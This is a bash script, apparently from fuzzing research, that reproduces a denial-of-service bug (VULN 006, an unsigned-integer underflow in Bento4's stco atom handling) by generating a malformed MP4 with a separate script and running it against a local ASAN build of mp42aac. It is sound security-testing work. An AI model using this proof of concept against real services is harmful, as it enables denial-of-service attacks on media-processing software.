#!/usr/bin/env bash
# VULN 006 – AP4_StcoAtom unsigned-integer underflow → OOM DoS
# Run PoC against the ASAN-instrumented mp42aac binary.

set -euo pipefail

BINARY="/data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac"
GEN_SCRIPT="$(dirname "$0")/vuln_006_gen.py"
INPUT="$(dirname "$0")/vuln_006.mp4"
OUTPUT="$(dirname "$0")/vuln_006_out.aac"
LOG="$(dirname "$0")/vuln_006_result.txt"

echo "=== VULN 006 PoC ===" | tee "$LOG"
echo "Binary : $BINARY"     | tee -a "$LOG"
echo "Input  : $INPUT"      | tee -a "$LOG"
echo ""                      | tee -a "$LOG"

# (Re)generate the input file
echo "[*] Generating malformed MP4 ..." | tee -a "$LOG"
python3 "$GEN_SCRIPT"

# Run the binary with ASAN RSS limit (like vuln_005).
# On this 1-TiB system the OOM crash won't fire because the 1-GiB buffer
# is allocated but never touched (stream.Read EOS immediately).
echo "[*] Running mp42aac (ASAN hard_rss_limit_mb=1024) ..."  | tee -a "$LOG"
set +e
ASAN_OPTIONS=hard_rss_limit_mb=1024 \
    "$BINARY" "$INPUT" "$OUTPUT" >> "$LOG" 2>&1
EXIT_CODE=$?
set -e

echo ""                            | tee -a "$LOG"
echo "Exit code: $EXIT_CODE"       | tee -a "$LOG"

if [ "$EXIT_CODE" -ne 0 ]; then
    echo "[!] Non-zero exit → crash/abort confirmed." | tee -a "$LOG"
else
    echo "[?] Process exited normally (unexpected)." | tee -a "$LOG"
fi
